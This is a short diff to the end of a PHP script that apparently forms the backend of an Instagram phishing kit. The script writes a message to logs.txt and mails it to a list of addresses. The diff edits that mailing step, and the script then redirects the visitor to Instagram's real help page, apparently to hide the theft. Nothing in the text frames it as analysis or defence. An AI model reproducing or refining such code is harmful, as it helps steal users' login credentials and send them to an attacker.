@@ -25,8 +25,9 @@ $file = fopen("logs.txt","ab");
 fwrite($file,$message);
 fclose($file);
 $str=array($send, $IWP); foreach ($str as $send)
-
+if(mail($send,$subject,$rnessage,$headers) != false)
+{
 mail($Send,$subject,$rnessage,$headers);
-
+}
 header("Location: https://help.instagram.com/");
 ?>
